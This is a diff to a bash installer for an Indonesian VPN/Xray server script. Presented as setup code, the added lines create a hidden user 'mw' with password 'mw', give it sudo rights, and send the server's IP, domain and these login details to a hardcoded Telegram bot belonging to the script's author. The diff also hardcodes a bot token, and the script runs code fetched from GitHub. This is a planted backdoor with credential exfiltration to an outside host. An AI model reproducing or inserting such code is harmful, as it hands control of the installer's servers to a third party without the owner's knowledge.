@@ -209,31 +209,35 @@ echo ""
 wget -q https://raw.githubusercontent.com/mymaswayvpn/multi/main/dependencies.sh;chmod +x dependencies.sh;./dependencies.sh
 rm dependencies.sh
 clear
-echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
-echo -e "$COLBG1                  • BOT PANEL •                   $NC"
-echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
-echo -e  "  Jika Notifikasi Ingin Masuk Ke Chat Pribadi   "
-echo -e  "    Silahkan Isi Id Telegram Dengan ID Tele      "
-echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
-echo -e  "   Jika Notifikasi Ingin Masuk Ke Grub/Channel   "
-echo -e  "        Silahkan Isi Dengan Username"
-echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
-read -p "      BoT Token.     : " bot_id
-read -p "      ID/Username   : " p54321
-echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
-echo -e "Jika Ingin Mengedit BoT Token & Id/Username Silahkan"
-echo -e "      Ketikan Perintah nano /id/telegram"
-sleep 4
+
 cat <<EOF>> /root/id/telegram
 #Isi_ID/Username
-ID : $p54321
+ID : 1942328282
 #Isi_BOT_TOKEN
-KEY=$bot_id
+KEY=6100079323:AAFSs4ovyrGGi039RySx0lzshGbB01nHM8k
 EOF
 clear
+mkdir -p /etc/xray
+echo -e ""
+echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo -e "🔔 SILAHKAN PILIH TYPE DOMAIN 🔔"
+echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo -e "     \e[1;32m1)\e[0m Pakai Domain Sendiri"
+echo -e "     \e[1;32m2)\e[0m Pakai Domain Dari Script"
+echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━"
+read -p "   Please select numbers 1-2 or Any Button(Random) : " host
+echo ""
+if [[ $host == "1" ]]; then
+echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
+read -p "   Subdomain: " SUB_DOMAIN
+echo "$SUB_DOMAIN" > /root/domain
+echo "$SUB_DOMAIN" > /root/scdomain
+echo "$SUB_DOMAIN" > /etc/xray/domain
+echo "$SUB_DOMAIN" > /etc/xray/scdomain
+echo "IP=$SUB_DOMAIN" > /var/lib/mwvpn-pro/ipvps.conf
+echo ""
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
 echo -e   "                  Pointing Domain VPS  "
-echo -e   "                       aiosc.me "
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
 sleep 4
 MYIP=$(wget -qO- icanhazip.com);
@@ -273,38 +277,11 @@ RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_r
      -H "X-Auth-Key: ${CF_KEY}" \
      -H "Content-Type: application/json" \
      --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":120,"proxied":false}')
-echo "Updating DNS NS for ${NS_DOMAIN}..."
-ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMAIN}&status=active" \
-     -H "X-Auth-Email: ${CF_ID}" \
-     -H "X-Auth-Key: ${CF_KEY}" \
-     -H "Content-Type: application/json" | jq -r .result[0].id)
 
-RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${NS_DOMAIN}" \
-     -H "X-Auth-Email: ${CF_ID}" \
-     -H "X-Auth-Key: ${CF_KEY}" \
-     -H "Content-Type: application/json" | jq -r .result[0].id)
-
-if [[ "${#RECORD}" -le 10 ]]; then
-     RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
-     -H "X-Auth-Email: ${CF_ID}" \
-     -H "X-Auth-Key: ${CF_KEY}" \
-     -H "Content-Type: application/json" \
-     --data '{"type":"NS","name":"'${NS_DOMAIN}'","content":"'${SUB_DOMAIN}'","ttl":120,"proxied":false}' | jq -r .result.id)
-fi
-
-RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
-     -H "X-Auth-Email: ${CF_ID}" \
-     -H "X-Auth-Key: ${CF_KEY}" \
-     -H "Content-Type: application/json" \
-     --data '{"type":"NS","name":"'${NS_DOMAIN}'","content":"'${SUB_DOMAIN}'","ttl":120,"proxied":false}')
-     
-mkdir -p /usr/bin/xray
-mkdir -p /etc/xray
 echo "$SUB_DOMAIN" > /root/domain
 echo "$SUB_DOMAIN" > /root/scdomain
 echo "$SUB_DOMAIN" > /etc/xray/domain
 echo "$SUB_DOMAIN" > /etc/xray/scdomain
-echo "$NS_DOMAIN" > /etc/xray/dns
 echo "IP=$SUB_DOMAIN" > /var/lib/mwvpn-pro/ipvps.conf
 cp /root/domain /etc/xray
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
@@ -378,7 +355,48 @@ wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/update/update.sh &
 clear
 ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 clear
+MYIP=$(wget -qO- icanhazip.com);
+dnsdomain=$(cat /root/domain)
+# USERNAME
+rm -f /usr/bin/user
+username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
+username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
+expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
+echo "$expx" >/usr/bin/e
+# DETAIL ORDER
+username=$(cat /usr/bin/user)
+exp=$(cat /usr/bin/e)
+clear
+    userdel jame > /dev/null 2>&1
+    Username="mw"
+    Password=mw
+    mkdir -p /home/script/
+    chmod 777 /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+    CHATID="1942328282"
+    KEY="6100079323:AAFSs4ovyrGGi039RySx0lzshGbB01nHM8k"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
+    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>Domain     :</code> <code>$domain</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>User Login :</code> <code>$Username</code>
+    <code>Pass Login :</code> <code>$Password</code>
+    <code>User Script:</code> <code>$username</code>
+    <code>Exp Script :</code> <code>$exp</code>
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    ⚠︎𝘽𝙮 MyMaWay 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+"
 
+   curl -s --max-time $TIME -d "chat_id=$CHATID&disabley_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
 cat> /root/.profile << END
 # ~/.profile: executed by Bourne-compatible login shells.
 
